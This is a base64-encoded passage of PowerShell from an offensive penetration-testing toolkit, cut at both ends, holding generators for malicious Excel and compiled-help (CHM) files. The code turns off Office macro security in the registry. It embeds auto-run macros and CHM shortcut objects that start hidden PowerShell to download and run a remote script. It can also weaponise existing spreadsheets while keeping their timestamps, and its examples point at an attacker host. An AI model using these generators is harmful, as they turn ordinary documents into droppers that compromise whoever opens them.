CB0dXJucyBvZmYgTWFjcm8gU2VjdXJpdHkuIFVzZSAtUmVtYWluU2FmZSB0byB0dXJuIGl0IGJhY2sgb24uCgoKLkxJTksKaHR0cDovL3d3dy5sYWJvZmFwZW5ldHJhdGlvbnRlc3Rlci5jb20vMjAxNC8xMS9wb3dlcnNoZWxsLWZvci1jbGllbnQtc2lkZS1hdHRhY2tzLmh0bWwKaHR0cHM6Ly9naXRodWIuY29tL3NhbXJhdGFzaG9rL25pc2hhbmcKIz4KCgogICAgW0NtZGxldEJpbmRpbmcoKV0gUGFyYW0oCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbj0wLCBNYW5kYXRvcnkgPSAkRmFsc2UpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFBheWxvYWQsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbj0xLCBNYW5kYXRvcnkgPSAkRmFsc2UpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFBheWxvYWRVUkwsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb249MiwgTWFuZGF0b3J5ID0gJEZhbHNlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRBcmd1bWVudHMsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbj0zLCBNYW5kYXRvcnkgPSAkRmFsc2UpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJEV4Y2VsRmlsZURpciwKICAgICAgICAKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uPTQsIE1hbmRhdG9yeSA9ICRGYWxzZSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkT3V0cHV0RmlsZT0iJHB3ZFxTYWxhcnlfRGV0YWlscy54bHMiLAoKICAgICAgICAKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uPTUsIE1hbmRhdG9yeSA9ICRGYWxzZSldCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkUmVjdXJzZSwKICAgICAgICAKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uPTYsIE1hbmRhdG9yeSA9ICRGYWxzZSldCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkUmVtb3ZlWGxzeCwKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbj03LCBNYW5kYXRvcnkgPSAkRmFsc2UpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFJlbWFpblNhZmUKICAgICkKICAgIAogICAgI2h0dHA6Ly9zdGFja292ZXJmbG93LmNvbS9xdWVzdGlvbnMvMjEyNzg3NjAvaG93LXRvLWFkZC12YmEtY29kZS1pbi1leGNlbC13b3Jrc2hlZXQtaW4tcG93ZXJzaGVsbAogICAgJEV4Y2VsID0gTmV3LU9iamVjdCAtQ29tT2JqZWN0IEV4Y2VsLkFwcGxpY2F0aW9uCiAgICAkRXhjZWxWZXJzaW9uID0gJEV4Y2VsLlZlcnNpb24KICAgICNDaGVjayBmb3IgT2ZmaWNlIDIwMDcgb3IgT2ZmaWNlIDIwMDMKICAgIGlmICgoJEV4Y2VsVmVyc2lvbiAtZXEgIjEyLjAiKSAtb3IgICgkRXhjZWxWZXJzaW9uIC1lcSAiMTEuMCIpKQogICAgewogICAgICAgICRFeGNlbC5EaXNwbGF5QWxlcnRzID0gJEZhbHNlCiAgICB9CiAgICBlbHNlCiAgICB7CiAgICAgICAgJEV4Y2VsLkRpc3BsYXlBbGVydHMgPSAid2RBbGVydHNOb25lIgogICAgfSAgICAKICAgICNUdXJuIG9mZiBNYWNybyBTZWN1cml0eQogICAgTmV3LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAiSEtDVTpcU29mdHdhcmVcTWljcm9zb2Z0XE9mZmljZVwkRXhjZWxWZXJzaW9uXGV4Y2VsXFNlY3VyaXR5IiAtTmFtZSBBY2Nlc3NWQk9NIC1Qcm9wZXJ0eVR5cGUgRFdPUkQgLVZhbHVlIDEgLUZvcmNlIHwgT3V0LU51bGwKICAgIE5ldy1JdGVtUHJvcGVydHkgLVBhdGggIkhLQ1U6XFNvZnR3YXJlXE1pY3Jvc29mdFxPZmZpY2VcJEV4Y2VsVmVyc2lvblxleGNlbFxTZWN1cml0eSIgLU5hbWUgVkJBV2FybmluZ3MgLVByb3BlcnR5VHlwZSBEV09SRCAtVmFsdWUgMSAtRm9yY2UgfCBPdXQtTnVsbAoKICAgIGlmKCEkUGF5bG9hZCkKICAgIHsKICAgICAgICAkUGF5bG9hZCA9ICJwb3dlcnNoZWxsLmV4ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtbm9wcm9maWxlIC1jIElFWCAoKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJyRQYXlsb2FkVVJMJykpOyRBcmd1bWVudHMiCiAgICB9CiAgICAjTWFjcm8gQ29kZQogICAgI01hY3JvIGNvZGUgZnJvbSBoZXJlIGh0dHA6Ly9lbmlnbWEweDMud29yZHByZXNzLmNvbS8yMDE0LzAxLzExL3VzaW5nLWEtcG93ZXJzaGVsbC1wYXlsb2FkLWluLWEtY2xpZW50LXNpZGUtYXR0YWNrLwogICAgJENvZGVBdXRvID0gQCIKICAgIFN1YiBBdXRvX09wZW4oKQogICAgRXhlY3V0ZQoKICAgIEVuZCBTdWIKCgogICAgICAgICBQdWJsaWMgRnVuY3Rpb24gRXhlY3V0ZSgpIEFzIFZhcmlhbnQKICAgICAgICAgICAgQ29uc3QgSElEREVOX1dJTkRPVyA9IDAKICAgICAgICAgICAgc3RyQ29tcHV0ZXIgPSAiLiIKICAgICAgICAgICAgU2V0IG9ialdNSVNlcnZpY2UgPSBHZXRPYmplY3QoIndpbm1nbXRzOlxcIiAmIHN0ckNvbXB1dGVyICYgIlxyb290XGNpbXYyIikKICAgICAgICAgCiAgICAgICAgICAgIFNldCBvYmpTdGFydHVwID0gb2JqV01JU2VydmljZS5HZXQoIldpbjMyX1Byb2Nlc3NTdGFydHVwIikKICAgICAgICAgICAgU2V0IG9iakNvbmZpZyA9IG9ialN0YXJ0dXAuU3Bhd25JbnN0YW5jZV8KICAgICAgICAgICAgb2JqQ29uZmlnLlNob3dXaW5kb3cgPSBISURERU5fV0lORE9XCiAgICAgICAgICAgIFNldCBvYmpQcm9jZXNzID0gR2V0T2JqZWN0KCJ3aW5tZ210czpcXCIgJiBzdHJDb21wdXRlciAmICJccm9vdFxjaW12MjpXaW4zMl9Qcm9jZXNzIikKICAgICAgICAgICAgb2JqUHJvY2Vzcy5DcmVhdGUgIiRQYXlsb2FkIiwgTnVsbCwgb2JqQ29uZmlnLCBpbnRQcm9jZXNzSUQKICAgICAgICAgRW5kIEZ1bmN0aW9uCiJACgogICAgJENvZGVXb3JrYm9vayA9IEAiCiAgICBTdWIgV29ya2Jvb2tfT3BlbigpCiAgICBFeGVjdXRlCgogICAgRW5kIFN1YgoKCiAgICAgICAgIFB1YmxpYyBGdW5jdGlvbiBFeGVjdXRlKCkgQXMgVmFyaWFudAogICAgICAgICAgICBDb25zdCBISURERU5fV0lORE9XID0gMAogICAgICAgICAgICBzdHJDb21wdXRlciA9ICIuIgogICAgICAgICAgICBTZXQgb2JqV01JU2VydmljZSA9IEdldE9iamVjdCgid2lubWdtdHM6XFwiICYgc3RyQ29tcHV0ZXIgJiAiXHJvb3RcY2ltdjIiKQogICAgICAgICAKICAgICAgICAgICAgU2V0IG9ialN0YXJ0dXAgPSBvYmpXTUlTZXJ2aWNlLkdldCgiV2luMzJfUHJvY2Vzc1N0YXJ0dXAiKQogICAgICAgICAgICBTZXQgb2JqQ29uZmlnID0gb2JqU3RhcnR1cC5TcGF3bkluc3RhbmNlXwogICAgICAgICAgICBvYmpDb25maWcuU2hvd1dpbmRvdyA9IEhJRERFTl9XSU5ET1cKICAgICAgICAgICAgU2V0IG9ialByb2Nlc3MgPSBHZXRPYmplY3QoIndpbm1nbXRzOlxcIiAmIHN0ckNvbXB1dGVyICYgIlxyb290XGNpbXYyOldpbjMyX1Byb2Nlc3MiKQogICAgICAgICAgICBvYmpQcm9jZXNzLkNyZWF0ZSAiJFBheWxvYWQiLCBOdWxsLCBvYmpDb25maWcsIGludFByb2Nlc3NJRAogICAgICAgICBFbmQgRnVuY3Rpb24KIkAKCiAgCiAgICBpZiAoJEV4Y2VsRmlsZURpcikKICAgIHsKICAgICAgICAkRXhjZWxGaWxlcyA9IEdldC1DaGlsZEl0ZW0gJEV4Y2VsRmlsZURpciAqLnhsc3gKICAgICAgICBpZiAoJFJlY3Vyc2UgLWVxICRUcnVlKQogICAgICAgIHsKICAgICAgICAgICAgJEV4Y2VsRmlsZXMgPSBHZXQtQ2hpbGRJdGVtIC1SZWN1cnNlICRFeGNlbEZpbGVEaXIgKi54bHN4CiAgICAgICAgfQogICAgICAgIEZvckVhY2ggKCRFeGNlbEZpbGUgaW4gJEV4Y2VsRmlsZXMpCiAgICAgICAgewogICAgICAgICAgICAkRXhjZWwgPSBOZXctT2JqZWN0IC1Db21PYmplY3QgRXhjZWwuQXBwbGljYXRpb24KICAgICAgICAgICAgJEV4Y2VsLkRpc3BsYXlBbGVydHMgPSAkRmFsc2UKICAgICAgICAgICAgJFdvcmtCb29rID0gJEV4Y2VsLldvcmtib29rcy5PcGVuKCRFeGNlbEZpbGUuRnVsbE5hbWUpCiAgICAgICAgICAgICRFeGNlbE1vZHVsZSA9ICRXb3JrQm9vay5WQlByb2plY3QuVkJDb21wb25lbnRzLkl0ZW0oMSkKICAgICAgICAgICAgJEV4Y2VsTW9kdWxlLkNvZGVNb2R1bGUuQWRkRnJvbVN0cmluZygkQ29kZVdvcmtib29rKQogICAgICAgICAgICAkU2F2ZXBhdGggPSAkRXhjZWxGaWxlLkRpcmVjdG9yeU5hbWUgKyAiXCIgKyAkRXhjZWxGaWxlLkJhc2VOYW1lICsgIi54bHMiCiAgICAgICAgICAgICNBcHBlbmQgLnhscyB0byB0aGUgb3JpZ2luYWwgZmlsZSBuYW1lIGlmIGZpbGUgZXh0ZW5zaW9ucyBhcmUgaGlkZGVuIGZvciBrbm93biBmaWxlIHR5cGVzLgogICAgICAgICAgICBpZiAoKEdldC1JdGVtUHJvcGVydHkgSEtDVTpcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cRXhwbG9yZXJcQWR2YW5jZWQpLkhpZGVGaWxlRXh0IC1lcSAiMSIpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRTYXZlcGF0aCA9ICRFeGNlbEZpbGUuRnVsbE5hbWUgKyAiLnhscyIKICAgICAgICAgICAgfQogICAgICAgICAgICAkV29ya0Jvb2suU2F2ZWFzKCRTYXZlUGF0aCwgMTgpCiAgICAgICAgICAgIFdyaXRlLU91dHB1dCAiU2F2ZWQgdG8gZmlsZSAkU2F2ZVBhdGgiCiAgICAgICAgICAgICRFeGNlbC5Xb3JrYm9va3MuQ2xvc2UoKQogICAgICAgICAgICAkTGFzdE1vZGlmeVRpbWUgPSAkRXhjZWxGaWxlLkxhc3RXcml0ZVRpbWUKICAgICAgICAgICAgJEZpbmFsRG9jID0gR2V0LUNoaWxkSXRlbSAkU2F2ZXBhdGgKICAgICAgICAgICAgJEZpbmFsRG9jLkxhc3RXcml0ZVRpbWUgPSAkTGFzdE1vZGlmeVRpbWUKICAgICAgICAgICAgaWYgKCRSZW1vdmVYbHN4IC1lcSAkVHJ1ZSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICJEZWxldGluZyAkKCRFeGNlbEZpbGUuRnVsbE5hbWUpIgogICAgICAgICAgICAgICAgUmVtb3ZlLUl0ZW0gLVBhdGggJEV4Y2VsRmlsZS5GdWxsTmFtZQogICAgICAgICAgICB9CiAgICAgICAgICAgICRFeGNlbC5RdWl0KCkKICAgICAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BzZXJ2aWNlcy5NYXJzaGFsXTo6UmVsZWFzZUNvbU9iamVjdCgkRXhjZWwpCiAgICAgICAgfQogICAgfQogICAgZWxzZQogICAgewogICAgICAgICRXb3JrQm9vayA9ICRFeGNlbC5Xb3JrYm9va3MuQWRkKDEpCiAgICAgICAgJFdvcmtTaGVldD0kV29ya0Jvb2suV29ya1NoZWV0cy5pdGVtKDEpCiAgICAgICAgJEV4Y2VsTW9kdWxlID0gJFdvcmtCb29rLlZCUHJvamVjdC5WQkNvbXBvbmVudHMuQWRkKDEpCiAgICAgICAgJEV4Y2VsTW9kdWxlLkNvZGVNb2R1bGUuQWRkRnJvbVN0cmluZygkQ29kZUF1dG8pCiAgICAgICAgJFdvcmtCb29rLlNhdmVBcygkT3V0cHV0RmlsZSwgMTgpCiAgICAgICAgV3JpdGUtT3V0cHV0ICJTYXZlZCB0byBmaWxlICRPdXRwdXRGaWxlIgogICAgICAgICRFeGNlbC5Xb3JrYm9va3MuQ2xvc2UoKQogICAgICAgICRFeGNlbC5RdWl0KCkKICAgICAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcHNlcnZpY2VzLk1hcnNoYWxdOjpSZWxlYXNlQ29tT2JqZWN0KCRFeGNlbCkKICAgIH0KCiAgICBpZiAoJFJlbWFpblNhZmUgLWVxICRUcnVlKQogICAgewogICAgICAgICNUdXJuIG9uIE1hY3JvIFNlY3VyaXR5CiAgICAgICAgTmV3LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAiSEtDVTpcU29mdHdhcmVcTWljcm9zb2Z0XE9mZmljZVwkRXhjZWxWZXJzaW9uXGV4Y2VsXFNlY3VyaXR5IiAtTmFtZSBBY2Nlc3NWQk9NIC1WYWx1ZSAwIC1Gb3JjZSB8IE91dC1OdWxsCiAgICAgICAgTmV3LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAiSEtDVTpcU29mdHdhcmVcTWljcm9zb2Z0XE9mZmljZVwkRXhjZWxWZXJzaW9uXGV4Y2VsXFNlY3VyaXR5IiAtTmFtZSBWQkFXYXJuaW5ncyAtVmFsdWUgMCAtRm9yY2UgfCBPdXQtTnVsbAogICAgfQp9CgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyNPdXQtQ0hNIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCgoKZnVuY3Rpb24gT3V0LUNITQp7Cgo8IwouU1lOT1BTSVMKTmlzaGFuZyBzY3JpcHQgdXNlZnVsIGZvciBjcmVhdGluZyBDb21waWxlZCBIVE1MIEhlbHAgZmlsZSAoLkNITSkgd2hpY2ggY291bGQgYmUgdXNlZCB0byBydW4gUG93ZXJTaGVsbCBjb21tYW5kcyBhbmQgc2NyaXB0cy4KCi5ERVNDUklQVElPTgpUaGUgc2NyaXB0IGdlbmVyYXRlcyBhIENITSBmaWxlIHdoaWNoIG5lZWRzIHRvIGJlIHNlbnQgdG8gYSB0YXJnZXQuCllvdSBtdXN0IGhhdmUgaGhjLmV4ZSAoSFRNTCBIZWxwIFdvcmtzaG9wKSBvbiB5b3VyIG1hY2hpbmUgdG8gdXNlIHRoaXMgc2NyaXB0LgpIVE1MIEhlbHAgV29ya3Nob3AgaXMgYSBmcmVlIE1pY3Jvc29mdCBUb29sIGFuZCBjb3VsZCBiZSBkb3dubG9hZGVkIGZyb20gYmVsb3cgbGluazoKaHR0cDovL3d3dy5taWNyb3NvZnQuY29tL2VuLXVzL2Rvd25sb2FkL2RldGFpbHMuYXNweD9pZD0yMTEzOAoKLlBBUkFNRVRFUiBQYXlsb2FkClBheWxvYWQgd2hpY2ggeW91IHdhbnQgZXhlY3V0ZSBvbiB0aGUgdGFyZ2V0LgoKLlBBUkFNRVRFUiBQYXlsb2FkVVJMClVSTCBvZiB0aGUgcG93ZXJzaGVsbCBzY3JpcHQgd2hpY2ggd291bGQgYmUgZXhlY3V0ZWQgb24gdGhlIHRhcmdldC4KCi5QQVJBTUVURVIgQXJndW1lbnRzCkFyZ3VtZW50cyB0byB0aGUgcG93ZXJzaGVsbCBzY3JpcHQgdG8gYmUgZXhlY3V0ZWQgb24gdGhlIHRhcmdldC4KCi5QQVJBTUVURVIgT3V0cHV0UGF0aApQYXRoIHRvIHRoZSBkaXJlY3Rvcnkgd2hlcmUgdGhlIGZpbGVzIHdvdWxkIGJlIHNhdmVkLiBEZWZhdWx0IGlzIHRoZSBjdXJyZW50IGRpcmVjdG9yeS4KCi5FWEFNUExFClBTID4gT3V0LUNITSAtUGF5bG9hZCAiR2V0LVByb2Nlc3MiIC1ISENQYXRoICJDOlxQcm9ncmFtIEZpbGVzICh4ODYpXEhUTUwgSGVscCBXb3Jrc2hvcCIKCkFib3ZlIGNvbW1hbmQgd291bGQgZXhlY3V0ZSBHZXQtUHJvY2VzcyBvbiB0aGUgdGFyZ2V0IG1hY2hpbmUgd2hlbiB0aGUgQ0hNIGZpbGUgaXMgb3BlbmVkLgoKLkVYQU1QTEUKUFMgPiBPdXQtQ0hNIC1QYXlsb2FkVVJMIGh0dHA6Ly8xOTIuMTY4LjI1NC4xL0dldC1JbmZvcm1hdGlvbi5wczEgLUhIQ1BhdGggIkM6XFByb2dyYW0gRmlsZXMgKHg4NilcSFRNTCBIZWxwIFdvcmtzaG9wIgoKVXNlIGFib3ZlIGNvbW1hbmQgdG8gZ2VuZXJhdGUgQ0hNIGZpbGUgd2hpY2ggZG93bmxvYWQgYW5kIGV4ZWN1dGUgdGhlIGdpdmVuIHBvd2Vyc2hlbGwgc2NyaXB0IGluIG1lbW9yeSBvbiB0YXJnZXQuCgouRVhBTVBMRQpQUyA+IE91dC1DSE0gLVBheWxvYWQgIi1FbmNvZGVkQ29tbWFuZCA8PiIgLUhIQ1BhdGggIkM6XFByb2dyYW0gRmlsZXMgKHg4NilcSFRNTCBIZWxwIFdvcmtzaG9wIgoKVXNlIGFib3ZlIGNvbW1hbmQgdG8gZ2VuZXJhdGUgQ0hNIGZpbGUgd2hpY2ggZXhlY3V0ZXMgdGhlIGVuY29kZWQgY29tbWFuZC9zY3JpcHQuClVzZSBJbnZva2UtRW5jb2RlIGZyb20gTmlzaGFuZyB0byBlbmNvZGUgdGhlIGNvbW1hbmQgb3Igc2NyaXB0LgoKLkVYQU1QTEUKUFMgPiBPdXQtQ0hNIC1QYXlsb2FkVVJMIGh0dHA6Ly8xOTIuMTY4LjI1NC4xL3Bvd2VycHJldGVyLnBzbTEgLUFyZ3VtZW50cyBDaGVjay1WTSAtSEhDUGF0aCAiQzpcUHJvZ3JhbSBGaWxlcyAoeDg2KVxIVE1MIEhlbHAgV29ya3Nob3AiCgpVc2UgYWJvdmUgY29tbWFuZCB0byBwYXNzIGFuIGFyZ3VtZW50IHRvIHRoZSBwb3dlcnNoZWxsIHNjcmlwdC9tb2R1bGUuCgouTElOSwpodHRwOi8vd3d3LmxhYm9mYXBlbmV0cmF0aW9udGVzdGVyLmNvbS8yMDE0LzExL3Bvd2Vyc2hlbGwtZm9yLWNsaWVudC1zaWRlLWF0dGFja3MuaHRtbApodHRwczovL2dpdGh1Yi5jb20vc2FtcmF0YXNob2svbmlzaGFuZwoKLk5vdGVzCkJhc2VkIG9uIHRoZSB3b3JrIG1lbnRpb25lZCBpbiB0aGlzIHR3ZWV0IGJ5IEBpdGh1cnJpY2FuZXB0Cmh0dHBzOi8vdHdpdHRlci5jb20vaXRodXJyaWNhbmVwdC9zdGF0dXMvNTM0OTkzNzQzMTk2MDkwMzY4CiM+CgoKCiAgICBbQ21kbGV0QmluZGluZygpXSBQYXJhbSgKICAgICAgICAKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJEZhbHNlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRQYXlsb2FkLAogICAgICAgIAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkRmFsc2UpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFBheWxvYWRVUkwsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAyLCBNYW5kYXRvcnkgPSAkRmFsc2UpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJEFyZ3VtZW50cywKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDMsIE1hbmRhdG9yeSA9ICRUcnVlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRISENQYXRoLAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gNCwgTWFuZGF0b3J5ID0gJEZhbHNlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRPdXRwdXRQYXRoPSIkcHdkIgogICAgKQoKICAgICNDaGVjayBpZiB0aGUgcGF5bG9hZCBoYXMgYmVlbiBwcm92aWRlZCBieSB0aGUgdXNlcgogICAgaWYoISRQYXlsb2FkKQogICAgewogICAgICAgICRQYXlsb2FkID0gIklFWCAoKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJyRQYXlsb2FkVVJMJykpOyRBcmd1bWVudHMiCiAgICB9ICAgIAoKICAgICNDcmVhdGUgdGhlIHRhYmxlIG9mIGNvbnRlbnRzIGZvciB0aGUgQ0hNCiAgICAkQ0hNVGFibGVPZkNvbnRlbnRzID0gQCIKPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9JRVRGLy9EVEQgSFRNTC8vRU4iPgo8SFRNTD4KPEhFQUQ+CjxtZXRhIG5hbWU9IkdFTkVSQVRPUiIgY29udGVudD0iTWljcm9zb2Z0JnJlZzsgSFRNTCBIZWxwIFdvcmtzaG9wIDQuMSI+CjwhLS0gU2l0ZW1hcCAxLjAgLS0+CjwvSEVBRD48Qk9EWT4KICA8VUw+CiAgPExJPiA8T0JKRUNUIHR5cGU9InRleHQvc2l0ZW1hcCI+CiAgICAgIDxwYXJhbSBuYW1lPSJOYW1lIiB2YWx1ZT0iSVB2NCBBZHZhbmNlZCBJUCBTZXR0aW5ncyBUYWIiPgogICAgICA8cGFyYW0gbmFtZT0iTG9jYWwiIHZhbHVlPSJkb2MuaHRtIj4KICA8L09CSkVDVD4KICA8L1VMPgogIDxVTD4KICA8TEk+IDxPQkpFQ1QgdHlwZT0idGV4dC9zaXRlbWFwIj4KICAgICAgPHBhcmFtIG5hbWU9Ik5hbWUiIHZhbHVlPSJJUHY0IEFkdmFuY2VkIFdJTlMgVGFiIj4KICAgICAgPHBhcmFtIG5hbWU9IkxvY2FsIiB2YWx1ZT0iZG9jMS5odG0iPgogIDwvT0JKRUNUPgogIDwvVUw+CiAgPFVMPgogIDxMST4gPE9CSkVDVCB0eXBlPSJ0ZXh0L3NpdGVtYXAiPgogICAgICA8cGFyYW0gbmFtZT0iTmFtZSIgdmFsdWU9IklQdjQgQWx0ZXJuYXRlIENvbmZpZ3VyYXRpb24gVGFiIj4KICAgICAgPHBhcmFtIG5hbWU9IkxvY2FsIiB2YWx1ZT0iZG9jLmh0bSI+CiAgPC9PQkpFQ1Q+CiAgPC9VTD4KICA8VUw+CiAgPExJPiA8T0JKRUNUIHR5cGU9InRleHQvc2l0ZW1hcCI+CiAgICAgIDxwYXJhbSBuYW1lPSJOYW1lIiB2YWx1ZT0iSVB2NCBhbmQgSVB2NiBBZHZhbmNlZCBETlMgVGFiIj4KICAgICAgPHBhcmFtIG5hbWU9IkxvY2FsIiB2YWx1ZT0iZG9jMS5odG0iPgogIDwvT0JKRUNUPgogIDwvVUw+CjwvQk9EWT4KPC9IVE1MPgoiQAoKICAgICNDcmVhdGUgdGhlIFByb2plY3QgZmlsZSBmb3IgdGhlIENITQogICAgJENITVByb2plY3QgPSBAIgpbT1BUSU9OU10KQ29udGVudHMgZmlsZT0kT3V0cHV0UGF0aFxkb2MuaGhjCltGSUxFU10KJE91dHB1dFBhdGhcZG9jLmh0bQokT3V0cHV0UGF0aFxkb2MxLmh0bQoiQAogICAgI0NyZWF0ZSB0aGUgSFRNIGZpbGVzLCB0aGUgZmlyc3Qgb25lIGNvbnRyb2xzIHRoZSBwYXlsb2FkIGV4ZWN1dGlvbi4KICAgICRDSE1IVE1MMSA9IEAiCjxIVE1MPgo8VElUTEU+Q2hlY2sgZm9yIFdpbmRvd3MgdXBkYXRlcyBmcm9tIENvbW1hbmQgTGluZTwvVElUTEU+CjxIRUFEPgo8L0hFQUQ+CjxCT0RZPgoKPE9CSkVDVCBpZD14IGNsYXNzaWQ9ImNsc2lkOmFkYjg4MGE2LWQ4ZmYtMTFjZi05Mzc3LTAwYWEwMDNiN2ExMSIgd2lkdGg9MSBoZWlnaHQ9MT4KPFBBUkFNIG5hbWU9IkNvbW1hbmQiIHZhbHVlPSJTaG9ydEN1dCI+CiA8UEFSQU0gbmFtZT0iQnV0dG9uIiB2YWx1ZT0iQml0bWFwOjpzaG9ydGN1dCI+CiA8UEFSQU0gbmFtZT0iSXRlbTEiIHZhbHVlPSIsY21kLmV4ZSwvYyBDOlxXaW5kb3dzXFN5c3RlbTMyXFdpbmRvd3NQb3dlclNoZWxsXHYxLjBccG93ZXJzaGVsbC5leGUgLVdpbmRvd1N0eWxlIEhpZGRlbiAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtTm9Mb2dvIC1Ob1Byb2ZpbGUgJFBheWxvYWQiPgogPFBBUkFNIG5hbWU9Ikl0ZW0yIiB2YWx1ZT0iMjczLDEsMSI+CjwvT0JKRUNUPgoKPFNDUklQVD4KeC5DbGljaygpOwo8L1NDUklQVD4KCjxodG1sIERJUj0iTFRSIiB4bWxuczpNU0hlbHA9Imh0dHA6Ly9tc2RuLm1pY3Jvc29mdC5jb20vbXNoZWxwIiB4bWxuczpkZHVlPSJodHRwOi8vZGR1ZS5zY2hlbWFzLm1pY3Jvc29mdC5jb20vYXV0aG9yaW5nLzIwMDMvNSIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHhtbG5zOnRvb2w9Imh0dHA6Ly93d3cubWljcm9zb2Z0LmNvbS90b29sdGlwIj48aGVhZD48TUVUQSBIVFRQLUVRVUlWPSJDb250ZW50LVR5cGUiIENPTlRFTlQ9InRleHQvaHRtbDsgQ0hBUlNFVD1XaW5kb3dzLTEyNTIiPjwvTUVUQT48TUVUQSBOQU1FPSJzYXZlIiBDT05URU5UPSJoaXN0b3J5Ij48L01FVEE+PHRpdGxlPklQdjQgQWR2YW5jZWQgSVAgU2V0dGluZ3MgVGFiPC90aXRsZT48bGluayByZWw9InN0eWxlc2hlZXQiIHR5cGU9InRleHQvY3NzIiBocmVmPSIuLi9sb2NhbC9DbGFzc2ljLmNzcyI+PC9saW5rPjxzY3JpcHQgc3JjPSIuLi9sb2NhbC9zY3JpcHQuanMiPjwvc2NyaXB0PjwvaGVhZD48Ym9keT48ZGl2IGlkPSJoZWFkZXIiPjxoMT5JUHY0IEFkdmFuY2VkIElQIFNldHRpbmdzIFRhYjwvaDE+PC9kaXY+PGRpdiBpZD0ibWFpblNlY3Rpb24iPjxkaXYgaWQ9Im1haW5Cb2R5Ij48cCBjbGFzcz0icnVubmluZ0hlYWRlciI+PC9wPgo8cD5Zb3UgY2FuIHVzZSB0aGUgc2V0dGluZ3Mgb24gdGhpcyB0YWIgZm9yIHRoaXMgbmV0d29yayBjb25uZWN0aW9uIG9ubHkgaWYgeW91IGFyZSBub3QgdXNpbmcgdGhlIDxiPk9idGFpbiBhbiBJUCBhZGRyZXNzIGF1dG9tYXRpY2FsbHk8L2I+IG9uIHRoZSA8Yj5HZW5lcmFsPC9iPiB0YWIuPC9wPgoKPHA+PGI+SVAgYWRkcmVzc2VzPC9iPiBsaXN0cyBhZGRpdGlvbmFsIEludGVybmV0IFByb3RvY29sIHZlcnNpb27DgsKgNCAoSVB2NCkgYWRkcmVzc2VzIHRoYXQgY2FuIGJlIGFzc2lnbmVkIHRvIHRoaXMgbmV0d29yayBjb25uZWN0aW9uLiBUaGVyZSBpcyBubyBsaW1pdCB0byB0aGUgbnVtYmVyIG9mIElQIGFkZHJlc3NlcyB0aGF0IGNhbiBiZSBjb25maWd1cmVkLiBUaGlzIHNldHRpbmcgaXMgdXNlZnVsIGlmIHRoaXMgY29tcHV0ZXIgY29ubmVjdHMgdG8gYSBzaW5nbGUgcGh5c2ljYWwgbmV0d29yayBidXQgcmVxdWlyZXMgYWR2YW5jZWQgSVAgYWRkcmVzc2luZyBiZWNhdXNlIG9mIGVpdGhlciBvZiB0aGUgZm9sbG93aW5nIHJlYXNvbnM6PC9wPgoKPHVsPjxsaSBjbGFzcz0idW5vcmRlcmVkIj4KQSBzaW5nbGUgbG9naWNhbCBJUCBuZXR3b3JrIGlzIGluIHVzZSBhbmQgdGhpcyBjb21wdXRlciBuZWVkcyB0byB1c2UgbW9yZSB0aGFuIG9uZSBJUCBhZGRyZXNzIHRvIGNvbW11bmljYXRlIG9uIHRoYXQgbmV0d29yay48YnIgLz48YnIgLz4KPC9saT48bGkgY2xhc3M9InVub3JkZXJlZCI+Ck11bHRpcGxlIGxvZ2ljYWwgSVAgbmV0d29ya3MgYXJlIGluIHVzZSBhbmQgdGhpcyBjb21wdXRlciBuZWVkcyBhIGRpZmZlcmVudCBJUCBhZGRyZXNzIHRvIGNvbW11bmljYXRlIHdpdGggZWFjaCBvZiB0aGUgZGlmZmVyZW50IGxvZ2ljYWwgSVAgbmV0d29ya3MuPGJyIC8+PGJyIC8+CjwvbGk+PC91bD4KCjxwPjxiPkRlZmF1bHQgZ2F0ZXdheXM8L2I+IGxpc3RzIElQIGFkZHJlc3NlcyBmb3IgYWRkaXRpb